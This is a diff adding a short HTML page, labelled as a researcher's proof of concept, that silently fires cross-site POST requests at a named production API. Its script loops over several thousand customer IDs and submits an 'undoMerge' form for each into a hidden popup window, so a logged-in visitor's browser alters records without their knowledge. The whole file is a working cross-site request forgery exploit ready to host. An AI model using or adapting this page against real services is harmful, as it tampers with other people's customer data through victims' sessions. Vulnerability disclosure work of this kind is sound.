@@ -1,0 +1,33 @@
+<html>
+ <!-- shellreaper's PoC (fixed with dummy window target) -->
+ <body>
+   <script>
+     const start = 1393890;
+     const end   = 1400000;
+
+     let i = start;
+
+     function sendNext() {
+       if (i > end) return;
+
+       const form = document.createElement("form");
+       form.method = "POST";
+       form.action = "https://integration.servicetitan.com/app/api/customers/" + i + "/undoMerge";
+       form.target = "hiddenWin"; // always reuse same popup instead of navigating away
+
+       document.body.appendChild(form);
+       form.submit();
+       form.remove();
+
+       i++;
+
+       setTimeout(sendNext, 500);
+     }
+
+     // open/reuse the dummy window once
+     window.open("", "hiddenWin");
+
+     sendNext();
+   </script>
+ </body>
+</html>
